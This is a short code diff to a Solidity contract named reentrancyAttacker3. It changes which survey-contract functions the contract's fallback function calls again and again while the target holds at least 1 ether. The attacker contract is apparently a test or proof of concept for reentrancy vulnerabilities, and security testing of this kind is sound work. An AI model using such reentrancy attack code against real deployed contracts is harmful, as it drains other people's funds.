@@ -32,7 +32,9 @@ contract reentrancyAttacker3 {
     //fallback function tries to keep collecting reward from the bank
     fallback() external payable {
         if (address(smartSurvey).balance >= 1 ether) {
-            smartSurvey.endByOwner(surveyName);
+            smartSurvey.viewSurvey(surveyName);
+            smartSurvey.getSurvey(surveyName);
+            smartSurvey.vote(surveyName, 1);
         }
     }
 }
